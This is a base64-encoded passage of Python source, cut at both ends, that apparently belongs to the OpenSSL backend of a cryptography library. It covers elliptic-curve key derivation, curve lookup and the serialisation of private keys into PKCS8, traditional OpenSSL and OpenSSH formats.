b2ludCA9IHNlbGYuX2ZmaS5nYyhwb2ludCwgc2VsZi5fbGliLkVDX1BPSU5UX2ZyZWUpXHJcbiAgICAgICAgd2l0aCBzZWxmLl90bXBfYm5fY3R4KCkgYXMgYm5fY3R4OlxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuRUNfUE9JTlRfb2N0MnBvaW50KFxyXG4gICAgICAgICAgICAgICAgZ3JvdXAsIHBvaW50LCBwb2ludF9ieXRlcywgbGVuKHBvaW50X2J5dGVzKSwgYm5fY3R4XHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgaWYgcmVzICE9IDE6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIHB1YmxpYyBieXRlcyBmb3IgdGhlIGdpdmVuIGN1cnZlIilcclxuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkVDX0tFWV9zZXRfcHVibGljX2tleShlY19jZGF0YSwgcG9pbnQpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2VjX2NkYXRhX3RvX2V2cF9wa2V5KGVjX2NkYXRhKVxyXG4gICAgICAgIHJldHVybiBfRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleShzZWxmLCBlY19jZGF0YSwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGRlcml2ZV9lbGxpcHRpY19jdXJ2ZV9wcml2YXRlX2tleShcclxuICAgICAgICBzZWxmLCBwcml2YXRlX3ZhbHVlOiBpbnQsIGN1cnZlOiBlYy5FbGxpcHRpY0N1cnZlXHJcbiAgICApIC0+IGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5OlxyXG4gICAgICAgIGVjX2NkYXRhID0gc2VsZi5fZWNfa2V5X25ld19ieV9jdXJ2ZShjdXJ2ZSlcclxuXHJcbiAgICAgICAgZ2V0X2Z1bmMsIGdyb3VwID0gc2VsZi5fZWNfa2V5X2RldGVybWluZV9ncm91cF9nZXRfZnVuYyhlY19jZGF0YSlcclxuXHJcbiAgICAgICAgcG9pbnQgPSBzZWxmLl9saWIuRUNfUE9JTlRfbmV3KGdyb3VwKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocG9pbnQgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcG9pbnQgPSBzZWxmLl9mZmkuZ2MocG9pbnQsIHNlbGYuX2xpYi5FQ19QT0lOVF9mcmVlKVxyXG5cclxuICAgICAgICB2YWx1ZSA9IHNlbGYuX2ludF90b19ibihwcml2YXRlX3ZhbHVlKVxyXG4gICAgICAgIHZhbHVlID0gc2VsZi5fZmZpLmdjKHZhbHVlLCBzZWxmLl9saWIuQk5fY2xlYXJfZnJlZSlcclxuXHJcbiAgICAgICAgd2l0aCBzZWxmLl90bXBfYm5fY3R4KCkgYXMgYm5fY3R4OlxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuRUNfUE9JTlRfbXVsKFxyXG4gICAgICAgICAgICAgICAgZ3JvdXAsIHBvaW50LCB2YWx1ZSwgc2VsZi5fZmZpLk5VTEwsIHNlbGYuX2ZmaS5OVUxMLCBibl9jdHhcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICAgICAgYm5feCA9IHNlbGYuX2xpYi5CTl9DVFhfZ2V0KGJuX2N0eClcclxuICAgICAgICAgICAgYm5feSA9IHNlbGYuX2xpYi5CTl9DVFhfZ2V0KGJuX2N0eClcclxuXHJcbiAgICAgICAgICAgIHJlcyA9IGdldF9mdW5jKGdyb3VwLCBwb2ludCwgYm5feCwgYm5feSwgYm5fY3R4KVxyXG4gICAgICAgICAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuYWJsZSB0byBkZXJpdmUga2V5IGZyb20gcHJpdmF0ZV92YWx1ZSIpXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FQ19LRVlfc2V0X3B1YmxpY19rZXkoZWNfY2RhdGEsIHBvaW50KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcHJpdmF0ZSA9IHNlbGYuX2ludF90b19ibihwcml2YXRlX3ZhbHVlKVxyXG4gICAgICAgIHByaXZhdGUgPSBzZWxmLl9mZmkuZ2MocHJpdmF0ZSwgc2VsZi5fbGliLkJOX2NsZWFyX2ZyZWUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkVDX0tFWV9zZXRfcHJpdmF0ZV9rZXkoZWNfY2RhdGEsIHByaXZhdGUpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9lY19jZGF0YV90b19ldnBfcGtleShlY19jZGF0YSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9FbGxpcHRpY0N1cnZlUHJpdmF0ZUtleShzZWxmLCBlY19jZGF0YSwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIF9lY19rZXlfbmV3X2J5X2N1cnZlKHNlbGYsIGN1cnZlOiBlYy5FbGxpcHRpY0N1cnZlKTpcclxuICAgICAgICBjdXJ2ZV9uaWQgPSBzZWxmLl9lbGxpcHRpY19jdXJ2ZV90b19uaWQoY3VydmUpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2VjX2tleV9uZXdfYnlfY3VydmVfbmlkKGN1cnZlX25pZClcclxuXHJcbiAgICBkZWYgX2VjX2tleV9uZXdfYnlfY3VydmVfbmlkKHNlbGYsIGN1cnZlX25pZDogaW50KTpcclxuICAgICAgICBlY19jZGF0YSA9IHNlbGYuX2xpYi5FQ19LRVlfbmV3X2J5X2N1cnZlX25hbWUoY3VydmVfbmlkKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZWNfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2ZmaS5nYyhlY19jZGF0YSwgc2VsZi5fbGliLkVDX0tFWV9mcmVlKVxyXG5cclxuICAgIGRlZiBlbGxpcHRpY19jdXJ2ZV9leGNoYW5nZV9hbGdvcml0aG1fc3VwcG9ydGVkKFxyXG4gICAgICAgIHNlbGYsIGFsZ29yaXRobTogZWMuRUNESCwgY3VydmU6IGVjLkVsbGlwdGljQ3VydmVcclxuICAgICkgLT4gYm9vbDpcclxuICAgICAgICBpZiBzZWxmLl9maXBzX2VuYWJsZWQgYW5kIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBjdXJ2ZSwgc2VsZi5fZmlwc19lY2RoX2N1cnZlc1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5lbGxpcHRpY19jdXJ2ZV9zdXBwb3J0ZWQoY3VydmUpIGFuZCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBhbGdvcml0aG0sIGVjLkVDREhcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9lY19jZGF0YV90b19ldnBfcGtleShzZWxmLCBlY19jZGF0YSk6XHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9jcmVhdGVfZXZwX3BrZXlfZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FVlBfUEtFWV9zZXQxX0VDX0tFWShldnBfcGtleSwgZWNfY2RhdGEpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXR1cm4gZXZwX3BrZXlcclxuXHJcbiAgICBkZWYgX2VsbGlwdGljX2N1cnZlX3RvX25pZChzZWxmLCBjdXJ2ZTogZWMuRWxsaXB0aWNDdXJ2ZSkgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEdldCB0aGUgTklEIGZvciBhIGN1cnZlIG5hbWUuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgICAgIGN1cnZlX2FsaWFzZXMgPSB7InNlY3AxOTJyMSI6ICJwcmltZTE5MnYxIiwgInNlY3AyNTZyMSI6ICJwcmltZTI1NnYxIn1cclxuXHJcbiAgICAgICAgY3VydmVfbmFtZSA9IGN1cnZlX2FsaWFzZXMuZ2V0KGN1cnZlLm5hbWUsIGN1cnZlLm5hbWUpXHJcblxyXG4gICAgICAgIGN1cnZlX25pZCA9IHNlbGYuX2xpYi5PQkpfc24ybmlkKGN1cnZlX25hbWUuZW5jb2RlKCkpXHJcbiAgICAgICAgaWYgY3VydmVfbmlkID09IHNlbGYuX2xpYi5OSURfdW5kZWY6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgInt9IGlzIG5vdCBhIHN1cHBvcnRlZCBlbGxpcHRpYyBjdXJ2ZSIuZm9ybWF0KGN1cnZlLm5hbWUpLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfRUxMSVBUSUNfQ1VSVkUsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICByZXR1cm4gY3VydmVfbmlkXHJcblxyXG4gICAgQGNvbnRleHRtYW5hZ2VyXHJcbiAgICBkZWYgX3RtcF9ibl9jdHgoc2VsZik6XHJcbiAgICAgICAgYm5fY3R4ID0gc2VsZi5fbGliLkJOX0NUWF9uZXcoKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoYm5fY3R4ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGJuX2N0eCA9IHNlbGYuX2ZmaS5nYyhibl9jdHgsIHNlbGYuX2xpYi5CTl9DVFhfZnJlZSlcclxuICAgICAgICBzZWxmLl9saWIuQk5fQ1RYX3N0YXJ0KGJuX2N0eClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHlpZWxkIGJuX2N0eFxyXG4gICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgIHNlbGYuX2xpYi5CTl9DVFhfZW5kKGJuX2N0eClcclxuXHJcbiAgICBkZWYgX2VjX2tleV9kZXRlcm1pbmVfZ3JvdXBfZ2V0X2Z1bmMoc2VsZiwgY3R4KTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBHaXZlbiBhbiBFQ19LRVkgZGV0ZXJtaW5lIHRoZSBncm91cCBhbmQgd2hhdCBmdW5jdGlvbiBpcyByZXF1aXJlZCB0b1xyXG4gICAgICAgIGdldCBwb2ludCBjb29yZGluYXRlcy5cclxuICAgICAgICAiIiJcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGN0eCAhPSBzZWxmLl9mZmkuTlVMTClcclxuXHJcbiAgICAgICAgbmlkX3R3b19maWVsZCA9IHNlbGYuX2xpYi5PQkpfc24ybmlkKGIiY2hhcmFjdGVyaXN0aWMtdHdvLWZpZWxkIilcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KG5pZF90d29fZmllbGQgIT0gc2VsZi5fbGliLk5JRF91bmRlZilcclxuXHJcbiAgICAgICAgZ3JvdXAgPSBzZWxmLl9saWIuRUNfS0VZX2dldDBfZ3JvdXAoY3R4KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZ3JvdXAgIT0gc2VsZi5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIG1ldGhvZCA9IHNlbGYuX2xpYi5FQ19HUk9VUF9tZXRob2Rfb2YoZ3JvdXApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChtZXRob2QgIT0gc2VsZi5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIG5pZCA9IHNlbGYuX2xpYi5FQ19NRVRIT0RfZ2V0X2ZpZWxkX3R5cGUobWV0aG9kKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQobmlkICE9IHNlbGYuX2xpYi5OSURfdW5kZWYpXHJcblxyXG4gICAgICAgIGlmIG5pZCA9PSBuaWRfdHdvX2ZpZWxkIGFuZCBzZWxmLl9saWIuQ3J5cHRvZ3JhcGh5X0hBU19FQzJNOlxyXG4gICAgICAgICAgICBnZXRfZnVuYyA9IHNlbGYuX2xpYi5FQ19QT0lOVF9nZXRfYWZmaW5lX2Nvb3JkaW5hdGVzX0dGMm1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBnZXRfZnVuYyA9IHNlbGYuX2xpYi5FQ19QT0lOVF9nZXRfYWZmaW5lX2Nvb3JkaW5hdGVzX0dGcFxyXG5cclxuICAgICAgICBhc3NlcnQgZ2V0X2Z1bmNcclxuXHJcbiAgICAgICAgcmV0dXJuIGdldF9mdW5jLCBncm91cFxyXG5cclxuICAgIGRlZiBfZWNfa2V5X3NldF9wdWJsaWNfa2V5X2FmZmluZV9jb29yZGluYXRlcyhzZWxmLCBjdHgsIHg6IGludCwgeTogaW50KTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTZXRzIHRoZSBwdWJsaWMga2V5IHBvaW50IGluIHRoZSBFQ19LRVkgY29udGV4dCB0byB0aGUgYWZmaW5lIHggYW5kIHlcclxuICAgICAgICB2YWx1ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgICAgIGlmIHggPCAwIG9yIHkgPCAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkludmFsaWQgRUMga2V5LiBCb3RoIHggYW5kIHkgbXVzdCBiZSBub24tbmVnYXRpdmUuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHggPSBzZWxmLl9mZmkuZ2Moc2VsZi5faW50X3RvX2JuKHgpLCBzZWxmLl9saWIuQk5fZnJlZSlcclxuICAgICAgICB5ID0gc2VsZi5fZmZpLmdjKHNlbGYuX2ludF90b19ibih5KSwgc2VsZi5fbGliLkJOX2ZyZWUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkVDX0tFWV9zZXRfcHVibGljX2tleV9hZmZpbmVfY29vcmRpbmF0ZXMoY3R4LCB4LCB5KVxyXG4gICAgICAgIGlmIHJlcyAhPSAxOlxyXG4gICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgRUMga2V5LiIpXHJcblxyXG4gICAgZGVmIF9wcml2YXRlX2tleV9ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBzZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4gICAgICAgIGtleSxcclxuICAgICAgICBldnBfcGtleSxcclxuICAgICAgICBjZGF0YSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIyB2YWxpZGF0ZSBhcmd1bWVudCB0eXBlc1xyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGVuY29kaW5nLCBzZXJpYWxpemF0aW9uLkVuY29kaW5nKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJlbmNvZGluZyBtdXN0IGJlIGFuIGl0ZW0gZnJvbSB0aGUgRW5jb2RpbmcgZW51bSIpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZm9ybWF0LCBzZXJpYWxpemF0aW9uLlByaXZhdGVGb3JtYXQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiZm9ybWF0IG11c3QgYmUgYW4gaXRlbSBmcm9tIHRoZSBQcml2YXRlRm9ybWF0IGVudW0iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb25cclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiRW5jcnlwdGlvbiBhbGdvcml0aG0gbXVzdCBiZSBhIEtleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uICJcclxuICAgICAgICAgICAgICAgICJpbnN0YW5jZSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAjIHZhbGlkYXRlIHBhc3N3b3JkXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShlbmNyeXB0aW9uX2FsZ29yaXRobSwgc2VyaWFsaXphdGlvbi5Ob0VuY3J5cHRpb24pOlxyXG4gICAgICAgICAgICBwYXNzd29yZCA9IGIiIlxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uQmVzdEF2YWlsYWJsZUVuY3J5cHRpb25cclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBwYXNzd29yZCA9IGVuY3J5cHRpb25fYWxnb3JpdGhtLnBhc3N3b3JkXHJcbiAgICAgICAgICAgIGlmIGxlbihwYXNzd29yZCkgPiAxMDIzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiUGFzc3dvcmRzIGxvbmdlciB0aGFuIDEwMjMgYnl0ZXMgYXJlIG5vdCBzdXBwb3J0ZWQgYnkgIlxyXG4gICAgICAgICAgICAgICAgICAgICJ0aGlzIGJhY2tlbmQiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5zdXBwb3J0ZWQgZW5jcnlwdGlvbiB0eXBlIilcclxuXHJcbiAgICAgICAgIyBQS0NTOCArIFBFTS9ERVJcclxuICAgICAgICBpZiBmb3JtYXQgaXMgc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LlBLQ1M4OlxyXG4gICAgICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTTpcclxuICAgICAgICAgICAgICAgIHdyaXRlX2JpbyA9IHNlbGYuX2xpYi5QRU1fd3JpdGVfYmlvX1BLQ1M4UHJpdmF0ZUtleVxyXG4gICAgICAgICAgICBlbGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fbGliLmkyZF9QS0NTOFByaXZhdGVLZXlfYmlvXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVbnN1cHBvcnRlZCBlbmNvZGluZyBmb3IgUEtDUzgiKVxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcHJpdmF0ZV9rZXlfYnl0ZXNfdmlhX2JpbyhcclxuICAgICAgICAgICAgICAgIHdyaXRlX2JpbywgZXZwX3BrZXksIHBhc3N3b3JkXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBUcmFkaXRpb25hbE9wZW5TU0wgKyBQRU0vREVSXHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdC5UcmFkaXRpb25hbE9wZW5TU0w6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZCBhbmQgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobSwgc2VyaWFsaXphdGlvbi5Ob0VuY3J5cHRpb25cclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIkVuY3J5cHRlZCB0cmFkaXRpb25hbCBPcGVuU1NMIGZvcm1hdCBpcyBub3QgIlxyXG4gICAgICAgICAgICAgICAgICAgICJzdXBwb3J0ZWQgaW4gRklQUyBtb2RlLiJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAga2V5X3R5cGUgPSBzZWxmLl9saWIuRVZQX1BLRVlfaWQoZXZwX3BrZXkpXHJcblxyXG4gICAgICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTTpcclxuICAgICAgICAgICAgICAgIGlmIGtleV90eXBlID09IHNlbGYuX2xpYi5FVlBfUEtFWV9SU0E6XHJcbiAgICAgICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fbGliLlBFTV93cml0ZV9iaW9fUlNBUHJpdmF0ZUtleVxyXG4gICAgICAgICAgICAgICAgZWxpZiBrZXlfdHlwZSA9PSBzZWxmLl9saWIuRVZQX1BLRVlfRFNBOlxyXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlX2JpbyA9IHNlbGYuX2xpYi5QRU1fd3JpdGVfYmlvX0RTQVByaXZhdGVLZXlcclxuICAgICAgICAgICAgICAgIGVsaWYga2V5X3R5cGUgPT0gc2VsZi5fbGliLkVWUF9QS0VZX0VDOlxyXG4gICAgICAgICAgICAgICAgICAgIHdyaXRlX2JpbyA9IHNlbGYuX2xpYi5QRU1fd3JpdGVfYmlvX0VDUHJpdmF0ZUtleVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiVW5zdXBwb3J0ZWQga2V5IHR5cGUgZm9yIFRyYWRpdGlvbmFsT3BlblNTTCJcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gc2VsZi5fcHJpdmF0ZV9rZXlfYnl0ZXNfdmlhX2JpbyhcclxuICAgICAgICAgICAgICAgICAgICB3cml0ZV9iaW8sIGNkYXRhLCBwYXNzd29yZFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgaWYgZW5jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVI6XHJcbiAgICAgICAgICAgICAgICBpZiBwYXNzd29yZDpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiRW5jcnlwdGlvbiBpcyBub3Qgc3VwcG9ydGVkIGZvciBERVIgZW5jb2RlZCAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJ0cmFkaXRpb25hbCBPcGVuU1NMIGtleXMiXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgaWYga2V5X3R5cGUgPT0gc2VsZi5fbGliLkVWUF9QS0VZX1JTQTpcclxuICAgICAgICAgICAgICAgICAgICB3cml0ZV9iaW8gPSBzZWxmLl9saWIuaTJkX1JTQVByaXZhdGVLZXlfYmlvXHJcbiAgICAgICAgICAgICAgICBlbGlmIGtleV90eXBlID09IHNlbGYuX2xpYi5FVlBfUEtFWV9FQzpcclxuICAgICAgICAgICAgICAgICAgICB3cml0ZV9iaW8gPSBzZWxmLl9saWIuaTJkX0VDUHJpdmF0ZUtleV9iaW9cclxuICAgICAgICAgICAgICAgIGVsaWYga2V5X3R5cGUgPT0gc2VsZi5fbGliLkVWUF9QS0VZX0RTQTpcclxuICAgICAgICAgICAgICAgICAgICB3cml0ZV9iaW8gPSBzZWxmLl9saWIuaTJkX0RTQVByaXZhdGVLZXlfYmlvXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJVbnN1cHBvcnRlZCBrZXkgdHlwZSBmb3IgVHJhZGl0aW9uYWxPcGVuU1NMIlxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIHJldHVybiBzZWxmLl9iaW9fZnVuY19vdXRwdXQod3JpdGVfYmlvLCBjZGF0YSlcclxuXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuc3VwcG9ydGVkIGVuY29kaW5nIGZvciBUcmFkaXRpb25hbE9wZW5TU0wiKVxyXG5cclxuICAgICAgICAjIE9wZW5TU0ggKyBQRU1cclxuICAgICAgICBpZiBmb3JtYXQgaXMgc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0Lk9wZW5TU0g6XHJcbiAgICAgICAgICAgIGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUEVNOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHNzaC5zZXJpYWxpemVfc3NoX3ByaXZhdGVfa2V5KGtleSwgcGFzc3dvcmQpXHJcblxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIk9wZW5TU0ggcHJpdmF0ZSBrZXkgZm9ybWF0IGNhbiBvbmx5IGJlIHVzZWQiXHJcbiAgICAgICAgICAgICAgICAiIHdpdGggUEVNIGVuY29kaW5nIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgQW55dGhpbmcgdGhhdCBrZXktc3BlY2lmaWMgY29kZSB3YXMgc3VwcG9zZWQgdG8gaGFuZGxlIGVhcmxpZXIsXHJcbiAgICAgICAgIyBsaWtlIFJhdy5cclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJmb3JtYXQgaXMgaW52YWxpZCB3aXRoIHRoaXMga2V5IilcclxuXHJcbiAgICBkZWYgX3ByaXZhdGVfa2V5X2J5dGVzX3ZpYV9iaW8oc2VsZiwgd3JpdGVfYmlvLCBldnBfcGtleSwgcGFzc3dvcmQpOlxyXG4gICAgICAgIGlmIG5vdCBwYXNzd29yZDpcclxuICAgICAgICAgICAgZXZwX2NpcGhlciA9IHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgIyBUaGlzIGlzIGEgY3VyYXRlZCB2YWx1ZSB0aGF0IHdlIHdpbGwgdXBkYXRlIG92ZXIgdGltZS5cclxuICAgICAgICAgICAgZXZwX2NpcGhlciA9IHNlbGYuX2xpYi5FVlBfZ2V0X2NpcGhlcmJ5bmFtZShiImFlcy0yNTYtY2JjIilcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Jpb19mdW5jX291dHB1dChcclxuICAgICAgICAgICAgd3JpdGVfYmlvLFxyXG4gICAgICAgICAgICBldnBfcGtleSxcclxuICAgICAgICAgICAgZXZwX2NpcGhlcixcclxuICAgICAgICAgICAgcGFzc3dvcmQsXHJcbiAgICAgICAgICAgIGxlbihwYXNzd29yZCksXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9iaW9fZnVuY19vdXRwdXQoc2VsZiwgd3JpdGVfYmlvLCAqYXJncyk6XHJcbiAgICAgICAgYmlvID0gc2VsZi5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHdyaXRlX2JpbyhiaW8sICphcmdzKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlYWRfbWVtX2JpbyhiaW8pXHJcblxyXG4gICAgZGVmIF9wdWJsaWNfa2V5X2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICAgICBrZXksXHJcbiAgICAgICAgZXZwX3BrZXksXHJcbiAgICAgICAgY2RhdGEsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGVuY29kaW5nLCBzZXJpYWxpemF0aW9uLkVuY29kaW5nKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJlbmNvZGluZyBtdXN0IGJlIGFuIGl0ZW0gZnJvbSB0aGUgRW5jb2RpbmcgZW51bSIpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZm9ybWF0LCBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihc